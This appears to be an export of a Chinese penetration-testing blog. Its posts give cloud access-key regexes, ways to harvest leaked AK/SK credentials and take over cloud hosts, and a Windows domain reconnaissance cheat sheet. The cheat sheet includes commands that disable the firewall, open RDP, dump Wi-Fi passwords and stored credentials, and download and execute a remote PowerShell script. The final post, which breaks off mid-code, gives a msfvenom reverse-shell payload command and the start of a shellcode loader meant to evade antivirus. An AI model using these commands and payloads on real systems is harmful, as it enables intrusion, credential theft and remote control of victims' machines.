    <content><![CDATA[<h2 id="1-1-Google-Cloud"><a href="#1-1-Google-Cloud" class="headerlink" title="1.1 Google Cloud"></a>1.1 Google Cloud</h2><p>Google Cloud Platform (GCP) 的 Access Key 开头标识一般是 “GOOG”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^GOOG[\w\W]&#123;10,30&#125;$</span><br></pre></td></tr></table></figure>

<ul>
<li>服务账号的JSON文件中包含了Access Key和密钥的信息，其中Access Key为<code>client_email</code>，其长度不固定，由字母、数字和特殊字符组成。</li>
<li>密钥（Key）的长度为256个字符，由字母、数字和特殊字符组成。</li>
</ul>
<h2 id="1-2-Microsoft-Azure"><a href="#1-2-Microsoft-Azure" class="headerlink" title="1.2 Microsoft Azure"></a>1.2 Microsoft Azure</h2><p>Microsoft Azure 的 Access Key 开头标识一般是 “AZ”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^AZ[A-Za-z0-9]&#123;34,40&#125;$</span><br></pre></td></tr></table></figure>

<ul>
<li>Azure AD Application的Client ID通常用作Access Key，长度为36个字符，由字母和数字组成。</li>
<li>对于Azure AD Application的密钥（Secret），长度为44个字符，由字母、数字和特殊字符组成。</li>
</ul>
<h2 id="1-3-腾讯云"><a href="#1-3-腾讯云" class="headerlink" title="1.3 腾讯云"></a>1.3 腾讯云</h2><p>腾讯云 (Tencent Cloud) 的 Access Key 开头标识一般是 “AKID”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^AKID[A-Za-z0-9]&#123;13,20&#125;$</span><br></pre></td></tr></table></figure>

<ul>
<li>SecretId长度为17个字符，由字母和数字组成。</li>
<li>SecretKey长度为40个字符，由字母和数字组成。</li>
</ul>
<h2 id="1-4-亚马逊云"><a href="#1-4-亚马逊云" class="headerlink" title="1.4 亚马逊云"></a>1.4 亚马逊云</h2><p>亚马逊云计算服务 (Amazon Web Services, AWS) 的 Access Key 开头标识一般是 “AKIA”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^AKIA[A-Za-z0-9]&#123;16&#125;$</span><br></pre></td></tr></table></figure>

<ul>
<li>Access Key ID: 20 random uppercase alphanumeric characters like AKHDNAPO86BSHKDIRYTE</li>
<li>Secret access key ID: 40 random upper and lowercase characters: S836fh&#x2F;J73yHSb64Ag3Rkdi&#x2F;jaD6sPl6&#x2F;antFtU (It’s not possible to retrieve lost secret access key IDs).</li>
</ul>
<h2 id="1-5-IBM-Cloud"><a href="#1-5-IBM-Cloud" class="headerlink" title="1.5 IBM Cloud"></a>1.5 IBM Cloud</h2><p>IBM云 (IBM Cloud) 的 Access Key 开头标识一般是 “IBM”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^IBM[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>

<h2 id="1-6-Oracle-Cloud"><a href="#1-6-Oracle-Cloud" class="headerlink" title="1.6 Oracle Cloud"></a>1.6 Oracle Cloud</h2><p>Oracle云 (Oracle Cloud) 的 Access Key 开头标识一般是 “OCID”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^OCID[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>

<h2 id="1-7-阿里云"><a href="#1-7-阿里云" class="headerlink" title="1.7 阿里云"></a>1.7 阿里云</h2><p>阿里云 (Alibaba Cloud) 的 Access Key 开头标识一般是 “LTAI”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^LTAI[A-Za-z0-9]&#123;12,20&#125;$</span><br></pre></td></tr></table></figure>

<ul>
<li>Access Key ID长度为16-24个字符，由大写字母和数字组成。</li>
<li>Access Key Secret长度为30个字符，由大写字母、小写字母和数字组成。</li>
</ul>
<h2 id="1-8-华为云"><a href="#1-8-华为云" class="headerlink" title="1.8 华为云"></a>1.8 华为云</h2><p>华为云 (Huawei Cloud) 的 Access Key 开头标识一般是 “AK”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^AK[\w\W]&#123;10,62&#125;$</span><br></pre></td></tr></table></figure>

<ul>
<li>Access Key ID长度为64个字符，由字母、数字和特殊字符组成。</li>
<li>Secret Access Key长度为44个字符，由字母、数字和特殊字符组成。</li>
</ul>
<h2 id="1-9-百度云"><a href="#1-9-百度云" class="headerlink" title="1.9 百度云"></a>1.9 百度云</h2><p>百度云 (Baidu Cloud) 的 Access Key 开头标识一般是 “AK”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^AK[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>

<h2 id="1-10-京东云"><a href="#1-10-京东云" class="headerlink" title="1.10 京东云"></a>1.10 京东云</h2><p>京东云 (JD Cloud) 的 Access Key 开头标识一般是 “AK”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^AK[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>

<h2 id="1-11-UCloud"><a href="#1-11-UCloud" class="headerlink" title="1.11 UCloud"></a>1.11 UCloud</h2><p>UCloud (UCloud) 的 Access Key 开头标识一般是 “UC”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^UC[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>

<h2 id="1-12-青云"><a href="#1-12-青云" class="headerlink" title="1.12 青云"></a>1.12 青云</h2><p>青云 (QingCloud) 的 Access Key 开头标识一般是 “QY”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^QY[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>

<h2 id="1-13-金山云"><a href="#1-13-金山云" class="headerlink" title="1.13 金山云"></a>1.13 金山云</h2><p>金山云 (Kingsoft Cloud) 的 Access Key 开头标识一般是 “KS3”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^KS3[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>

<h2 id="1-14-联通云"><a href="#1-14-联通云" class="headerlink" title="1.14 联通云"></a>1.14 联通云</h2><p>联通云 (China Unicom Cloud) 的 Access Key 开头标识一般是 “LTC”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^LTC[A-Za-z0-9]&#123;10,60&#125;$</span><br></pre></td></tr></table></figure>

<h2 id="1-15-移动云"><a href="#1-15-移动云" class="headerlink" title="1.15 移动云"></a>1.15 移动云</h2><p>移动云 (China Mobile Cloud) 的 Access Key 开头标识一般是 “YD”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^YD[A-Za-z0-9]&#123;10,60&#125;$</span><br></pre></td></tr></table></figure>

<h2 id="1-6-电信云"><a href="#1-6-电信云" class="headerlink" title="1.6 电信云"></a>1.6 电信云</h2><p>中国电信云 (China Telecom Cloud) 的 Access Key 开头标识一般是 “CTC”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^CTC[A-Za-z0-9]&#123;10,60&#125;$</span><br></pre></td></tr></table></figure>

<h2 id="1-17-一云通"><a href="#1-17-一云通" class="headerlink" title="1.17 一云通"></a>1.17 一云通</h2><p>一云通 (Yonyou Cloud) 的 Access Key 开头标识一般是 “YYT”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^YYT[A-Za-z0-9]&#123;10,60&#125;$</span><br></pre></td></tr></table></figure>

<h2 id="1-18-用友云"><a href="#1-18-用友云" class="headerlink" title="1.18 用友云"></a>1.18 用友云</h2><p>用友云 (Yonyou Cloud) 的 Access Key 开头标识一般是 “YY”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^YY[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>

<h2 id="1-19-南大通用云"><a href="#1-19-南大通用云" class="headerlink" title="1.19 南大通用云"></a>1.19 南大通用云</h2><p>南大通用云 (OUCDC) 的 Access Key 开头标识一般是 “CI”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^CI[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>

<h2 id="1-20-G-Core-Labs"><a href="#1-20-G-Core-Labs" class="headerlink" title="1.20 G-Core Labs"></a>1.20 G-Core Labs</h2><p>G-Core Labs 的 Access Key 开头标识一般是 “gcore”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^gcore[A-Za-z0-9]&#123;10,30&#125;$</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>特征</tag>
      </tags>
  </entry>
  <entry>
    <title>AKsk泄露及利用</title>
    <url>/2023/07/26/aksk%E6%B3%84%E9%9C%B2%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h2 id="spring-heapdump文件造成的密钥泄露"><a href="#spring-heapdump文件造成的密钥泄露" class="headerlink" title="spring   heapdump文件造成的密钥泄露"></a>spring   heapdump文件造成的密钥泄露</h2><p>访问网站发现spring未授权，此时查看是否有heapdump文件，下载解压，全局搜索可发现密钥泄露</p>
<p>扫描工具：<a href="https://github.com/F6JO/RouteVulScan">https://github.com/F6JO/RouteVulScan</a></p>
<p>解压工具：<a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a></p>
<h3 id="爆破文件路径"><a href="#爆破文件路径" class="headerlink" title="爆破文件路径"></a>爆破文件路径</h3><p>文件存储位置会有一些敏感文件泄露，比如下载云服务器上某文件时抓包分析，可以再请求的位置爆破文件名，云服务器会返回带有访问密钥的敏感文件</p>
<p>得到文件地址后访问下载，</p>
<p>工具链接：<a href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></p>
<h3 id="js文件泄露秘钥"><a href="#js文件泄露秘钥" class="headerlink" title="js文件泄露秘钥"></a>js文件泄露秘钥</h3><p>谷歌<strong>扩展插件</strong>trufflehog，会在findings位置显示是否有秘钥泄露</p>
<h3 id="小程序上传等功能点泄露"><a href="#小程序上传等功能点泄露" class="headerlink" title="小程序上传等功能点泄露"></a>小程序上传等功能点泄露</h3><p>谋小程序打开后点击个人中心头像抓包，返回头中包含aksk</p>
<h3 id="配置信息的aksk泄露"><a href="#配置信息的aksk泄露" class="headerlink" title="配置信息的aksk泄露"></a>配置信息的aksk泄露</h3><p>常见的nacos后台的配置列表，打开示例可以看到一些配置信息，可以看到有aksk泄露</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="aksk接管存储桶"><a href="#aksk接管存储桶" class="headerlink" title="aksk接管存储桶"></a>aksk接管存储桶</h3><p><strong>OSS Browser–阿里云官方提供的OSS图形化管理工具</strong></p>
<p><a href="https://github.com/aliyun/oss-browser">https://github.com/aliyun/oss-browser</a></p>
<p><strong>腾讯云云主机接管平台：</strong></p>
<p><a href="https://cosbrowser.cloud.tencent.com/web/bucket">https://cosbrowser.cloud.tencent.com/web/bucket</a></p>
<p><strong>行云管家（支持多家云主机厂商</strong></p>
<p><a href="https://yun.cloudbility.com/">https://yun.cloudbility.com</a></p>
<p><strong>cf云环境利用框架</strong></p>
<p><a href="https://github.com/teamssix/cf/releases">https://github.com/teamssix/cf/releases</a></p>
<p><strong>针对阿里云主机rce</strong></p>
<p>工具链接：<a href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a></p>
<p>输入ak\sk查询主机，选择主机名填入，查看云助手列表是true或者false，为true可执行命令。</p>
]]></content>
  </entry>
  <entry>
    <title>导出谷歌浏览器插件</title>
    <url>/2023/07/26/%E5%AF%BC%E5%87%BA%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[<p>打开扩展程序的开发者模式</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230726112826076.png" alt="image-20230726112826076"></p>
<p>记下这个id，在目录C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Extensions里面找到这个id命名的文件夹，然后点击打包扩展程序</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230726112938985.png" alt="image-20230726112938985"></p>
<p>浏览中选择刚才的文件夹，点击打包扩展程序，</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230726113025083.png" alt="image-20230726113025083"></p>
<p>打包好crx格式的文件，拖到其他人的谷歌浏览器直接安装就好了</p>
]]></content>
  </entry>
  <entry>
    <title>fiddler抓微信小程序包</title>
    <url>/2023/09/17/fiddler%E6%8A%93%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<p><a href="https://www.telerik.com/download/fiddler">https://www.telerik.com/download/fiddler</a></p>
<p>fiddler下载地址</p>
<h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><p>打开tools的options</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230917150655700.png" alt="image-20230917150655700"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230917150855006.png" alt="image-20230917150855006"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230917150920942.png" alt="image-20230917150920942"></p>
<p>流量转发到burp</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230917150937798.png" alt="image-20230917150937798"></p>
<p>点这俩都可以开始抓包</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230917151049041.png" alt="image-20230917151049041"></p>
<h2 id="修改请求数据"><a href="#修改请求数据" class="headerlink" title="修改请求数据"></a>修改请求数据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用IE打开上面的登录页面然后在Fiddler的命令行中输入 	</span><br><span class="line">dpu http://home.51cto./index	</span><br><span class="line">bpu + url :当访问url时，对该url 进行一个拦截，bpu 就相当于一个拦截命令(如果想取消该命令，则在命令行中再次输入bpu 即可)输入错误的用户名和密码，点击登录Fiddler能中断这次会话，选择被中断的会话，点击Inspectors下的WebForms，然后修改用户名密码都为正确的，然后点击Run to Completion即可。</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>内网信息收集</title>
    <url>/2023/09/27/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>判断机器归属，个人机，工作组，域</p>
<p>当前机器角色，本地账户，机器账户，普通域用户，机器上有域用户的本地账户，</p>
<p>当前机器的网络环境，网段是192还是10</p>
<p>机器所处环境，运维，财务，客户，域控</p>
<p>whoami  查权限</p>
<p>ipconfig &#x2F;all 看下自己存在几个段 和本机内网ip地址</p>
<p>操作系统及版本信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo  findstr /B /C:&quot;OS 名称&quot;/C:&quot;OS 版本&quot;</span><br><span class="line">systeminfo  findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br></pre></td></tr></table></figure>

<p>查询补丁信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>

<p>查看系统体系结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo %processor_architecture%</span><br></pre></td></tr></table></figure>

<p>查看安装的软件版本和路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>

<p>查询本机服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>

<p>查看进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist:</span><br><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>


<p>查看启动程序信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure>


<p>查看计划任务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks/query /fo list /v</span><br></pre></td></tr></table></figure>


<p>查询主机开机时间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure>

<p>获取本地管理员信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>

<p>查看当在线用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query user||qwinsta</span><br></pre></td></tr></table></figure>

<p>查询端口列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat-an /横向，做票</span><br></pre></td></tr></table></figure>

<p>查看系统补丁</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic qfe get caption,description,hotfixid,installedon</span><br></pre></td></tr></table></figure>

<p>查看本机共享列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net share</span><br><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure>

<p>列出或断开本地计算机与所连接的客户端之间的会话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure>

<p>查询RDP端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp&quot; /V PortNumber</span><br></pre></td></tr></table></figure>


<p>0xd3d即为3389端口</p>
<p>查看代理配置信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure>


<p>查看路由表和可用接口ARP缓存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure>

<p>查看当前登录域及登录用户信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net config workstation //不存在域环境为WORKGROUP</span><br></pre></td></tr></table></figure>

<p>防火墙相关配置:<br>。查看防火墙配置<code>netsh firewall show config</code><br>。关闭防护墙:(注:修改防火墙配置需要管理员权限)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win2003以前: netsh firewall set opmode disable</span><br><span class="line">win2003以后: netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<p>修改防火墙配置允许制定程序连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win2003以前: netsh firewall add allowedprogram c: \nc.exe &quot;allow nc &quot; enable</span><br><span class="line">win2003以后: netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;</span><br></pre></td></tr></table></figure>

<p>允许指定程序退出:</p>
<pre><code>netsh advfirewall firewall add rule name =&quot;allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;
</code></pre>
<p>允许3389端口放行:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line">开启3389: REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">关闭3389:REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自定义防火墙存储:netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看1080端口的代理配置信息:reg query</span><br><span class="line">&quot;HEHY_CURRENT_USER\Software\Microsoft\windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看是否能修改删除日志</span><br><span class="line">wmic nteventlog get path,filename,writeable</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh wlan show profiles 系统命令获取登录过的WiFi名称</span><br><span class="line">netsh wlan show profile name=&quot;SecurityMind-Guest_5G” key=clear</span><br></pre></td></tr></table></figure>

<p>通过如下命令获取连接过的wifi密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#x27;netsh wlan show profiles&#x27;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmdkey /list 能够列举出系统中的Windows凭据</span><br></pre></td></tr></table></figure>

<p>查看域SID：whoami &#x2F;all</p>
<p>查找指定用户信息：net user xxx&#x2F;domain;</p>
<p>PowerSploit的invoke-Portscan.psl脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">远程加载脚本:</span><br><span class="line">IEX (New-0bjectNet.Webclient).DownloadString(&quot;http://192.168.1.128/PowerSploit/Recon/Invoke-PortScan.ps1&quot;)</span><br><span class="line">指定ip进行端口扫描:</span><br><span class="line">Invoke-Portscan -Hosts 192.168.1.103，192.168.1.100 -Ports&quot;80,445,3389&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用 ICMP协议探测: for /L %I in (1,1,254) D0 @ping -w 1 -n 1 192.168.1.%I |findstr &quot;TTL=&quot;</span><br><span class="line">empire中的ARP模块:使用usemodule situational_awareness/network/arpscan</span><br><span class="line">Linux下: for i in &#123;132..254&#125;; do ping -q -i 0.01 -c 3 192,168.64.$i &amp;&gt; /dev/null &amp;&amp; echo 192.168.64.$i is alive; done</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nishang的Invoke-ARPScan.ps1脚本: powershell.exe -exec bypass -command &quot;&amp; &#123;import-module C:\windows\temp\Invoke-arpscan.ps1; invoke-arpscan -cidr 192.168.1.0/20&#125;&quot; &gt;&gt; C:\windows temp\log.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用Scanline 扫描TCP/UDP端口扫描内网: scanline -h -t 22,80-89,110,445 -U 53,161,137 -0 C:\windows\temp\log.txt -p 192.168.102.1-254 /b</span><br></pre></td></tr></table></figure>

<h5 id="扫描域内端口需要关注以下几点："><a href="#扫描域内端口需要关注以下几点：" class="headerlink" title="扫描域内端口需要关注以下几点："></a>扫描域内端口需要关注以下几点：</h5><p>端口的banner服务：端口运行的服务，常见应用的默认端口</p>
<p>利用telnet进行扫描 <code>Telnet 192.168.102.8 2</code></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230927144958423.png" alt="image-20230927144958423"></p>
<p>metasploit端口扫描器 使用<code>auxiliary/scanner/portscan/tcp</code>模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set ports 1-1024</span><br><span class="line">set rhosts 192.168.102.8</span><br><span class="line">set threads 10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="收集域内基本信息"><a href="#收集域内基本信息" class="headerlink" title="收集域内基本信息"></a>收集域内基本信息</h3><p>查询域 <code>net view /domain</code></p>
<p>如果存在域，查看域内所有计算机： <code>net view /domain:hacke</code></p>
<p>查询域内所有用户列表：<code>net group/domain</code></p>
<p>系统自带用户身份列表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">domain admins;域管理员</span><br><span class="line">domain computers:域内机器</span><br><span class="line">domain controlers:域控制器</span><br><span class="line">domain guest:域访客</span><br><span class="line">domain user;域用户</span><br><span class="line">enterpriseadmins:企业系统管理员用户</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>普通情况下，<code>domain admins和enterprise admin对域内所有的域控制器有完全控制权限</code></p>
<p>查询域成员所有计算机列表</p>
<p><code>net group &quot;domain computers&quot; /domain</code></p>
<p>获取域密码信息</p>
<p><code>net accounts /domain </code></p>
<p>获取域信任信息</p>
<p><code>nltest /domain_trusts</code></p>
<p>扫描spn:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用Windows自带的setspn工具，普通与用户权限执行即可：setspn -T rootkit.org -Q */*</span><br></pre></td></tr></table></figure>

<h3 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h3><p>查看域控机器名<code>nltest /DCLIST:name   /netdom query pdc</code></p>
<p>查看域控主机名：<code>nslook -type=SRV _ldap.tcp</code></p>
<p>查看当前时间：<code>net time /domain</code></p>
<p>查看域控组:<code>net group &quot;domain controllers&quot; /domain</code></p>
<p>域控一般有两台，有一台备用</p>
<h4 id="获取域内用户和管理员信息"><a href="#获取域内用户和管理员信息" class="headerlink" title="获取域内用户和管理员信息"></a>获取域内用户和管理员信息</h4><p>查询所有域用户列表： <code>net user /domain</code></p>
<p>获取域内用户的详细信息： <code>wmic useraccount get /all </code></p>
<p>查询在线用户： <code>dsquery user</code></p>
<p>查询本地管理员组用户： <code>net localgroup admintrators</code></p>
<p>查询域管理员用户 <code>net group &quot;domain admins&quot; /domain</code></p>
<p>查询管理员用户组：<code>net group &quot;enterprise admins&quot; /domain</code></p>
<p>域管理员定位工具</p>
<p>在windows上 可以用<code>net session</code> 看谁用了本机资源，但是查不出谁在使用远程计算机资源，或者谁登录了远程计算机；</p>
<ul>
<li>psloggedon.exe: <code>psloggedon \\domainname</code>同样需要管理员；</li>
</ul>
<p>原理是通过注册表的HUEY_USER的key值来查询：</p>
<ul>
<li>PVEFindADUser.exe查找活动目录用户的登录设置，枚举域用户，查找特定计算机上登录的用户</li>
</ul>
<p>条件：管理员权限；<code>NET Framework2.0</code>环境</p>
<p><code>PVEFindADUser.exe -current</code> :显示所有域内计算机</p>
<ul>
<li><p><code>netview.exe</code>枚举用户，能够寻找登录会话，寻找共享，枚举登录的用户，大部分都不用管理员权限；</p>
</li>
<li><p>nmap的NSE脚本</p>
</li>
</ul>
<p><code>smb-enum-domains.nse</code> 对域控进行信息收集，获取主机信息，用户，使用密码策略的用户;<br><code>smb-enum-users.nse</code> 拿到了域内某台主机的权限，但是权限有限，可以用这个脚本对预控进行扫描</p>
<p><code>smb-enum-shares.nse</code>便利远程主机的共享目录<br><code>smb-enum-processes.nse</code>对进程进行遍历<br><code>smb-enum-session.nse</code>获取域内主机的登录会话，查看是否有用户登录<br><code>smb-enum-discovery.nse</code>收集 目标主机的os information,计算机名，域名，域林名称，NetBIOS机器名，工作组，系统时间:</p>
<ul>
<li>PowerView脚本</li>
</ul>
<p><code>powershell.exe -exec bypass -command &quot;&amp; &#123;import-module C:\powerview.ps1;Invoke-UserHunter&#125;&quot;</code>接受用户名，用户列表，和域组列表<br><code>powershell.exe -exec bypass -command &quot;&amp; &#123;import-module C:\powerview.ps1;Invoke-StealtUserHunter&#125;&quot;</code>获取域内所有的用户:</p>
<p>获取域管理员列表:<code>net group &quot;domain admins&quot; /domain</code></p>
<p>列出本机所有进程及进程用户:<code>tasklist /v</code></p>
<p>查看域控列表：<code>net group &quot;domain controllers&quot; /domain</code></p>
<p>所有活动域的会话列表 (netsess.exe列表): netsess -h</p>
<p>利用powershell收集信息<br>要想执行脚本需要修改配置:set-executionpolicy unrestricted</p>
<p>导入模块：</p>
]]></content>
  </entry>
  <entry>
    <title>免杀马</title>
    <url>/2023/07/08/%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E9%A9%AC/</url>
    <content><![CDATA[<p>生成木马</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.98 LPORT=2333 -f py</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 192.168.151.171 2333</span></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51&quot;</span></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">PAGE_EXECUTE_READWRITE = <span class="number">0x00000040</span>  <span class="comment"># 参数设定</span></span><br><span class="line">VIRTUAL_MEM = (<span class="number">0x1000</span> | <span class="number">0x2000</span>)  <span class="comment"># 参数设定</span></span><br><span class="line">buf_arr = <span class="built_in">bytearray</span>(buf)  <span class="comment"># shellcode变为一个新的字节数组</span></span><br><span class="line">buf_size = <span class="built_in">len</span>(buf_arr)  <span class="comment"># 计算shellcode的大小</span></span><br><span class="line">kernel32 = ctypes.cdll.LoadLibrary(<span class="string">&quot;kernel32.dll&quot;</span>)  <span class="comment"># 调用kernel32.d11</span></span><br><span 